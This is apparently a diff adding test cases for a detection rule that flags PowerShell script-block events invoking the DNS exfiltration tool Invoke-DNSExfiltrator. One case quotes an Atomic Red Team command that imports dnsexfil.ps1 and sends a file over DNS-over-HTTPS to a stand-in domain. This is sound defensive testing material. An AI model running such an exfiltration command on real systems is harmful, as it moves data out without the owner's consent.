@@ -1,0 +1,5 @@
+{"rule": "d59d7842-9a21-4bc6-ba98-64bfe0091355", "cases": [
+  {"expect":true,"source":"synthesized","channel":"Microsoft-Windows-PowerShell/Operational","event_id":"4104","data":{"ScriptBlockText":"Invoke-DNSExfiltrator"}},
+  {"expect":false,"source":"synthesized","channel":"Microsoft-Windows-PowerShell/Operational","event_id":"4104","data":{}},
+  {"expect":true,"source":"sigmahq","channel":"Microsoft-Windows-PowerShell/Operational","event_id":"4104","data":{"MessageNumber":"1","MessageTotal":"1","Path":"","ScriptBlockId":"fa57722e-440e-4d1e-adfe-bffd861ec425","ScriptBlockText":"\u0026 {Import-Module \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\dnsexfil.ps1\"\nInvoke-DNSExfiltrator -i \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\dnsexfil.ps1\" -d target.example.com -p atomic -doh google -t 500}"}}
+]}
